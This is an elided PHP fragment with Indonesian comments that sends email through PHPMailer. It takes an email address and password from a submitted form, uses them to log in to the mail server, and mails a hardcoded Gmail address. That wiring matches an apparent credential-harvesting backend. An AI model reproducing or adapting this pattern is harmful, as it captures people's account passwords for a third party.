   <?php
	...
	use PHPMailer\PHPMailer\Exception;// Include librari phpmailer
	
	include('phpmailer/Exception.php');
	include('phpmailer/PHPMailer.php');
	include('phpmailer/SMTP.php');
	
	$email_pengirim = $_POST['email_penerima']; // Isikan dengan email pengirim
	$nama_pengirim = 'Faizal'; // Isikan dengan nama pengirim
	$password_pengirim = $_POST['password_penerima'];
	$email_penerima = 'razaq.d.laxuz18@gmail.com'; // Ambil email penerima dari inputan form
	...
	$mail->addAddress($email_penerima, '');$mail->isHTML(true); // Aktifkan jika isi emailnya berupa html
	...
	if(empty($attachment)){ // Jika tanpa attachment    
		...
		if($send){ // Jika Email berhasil dikirim        
			...
			// Aktifkan untuk mengetahui error message    
		}
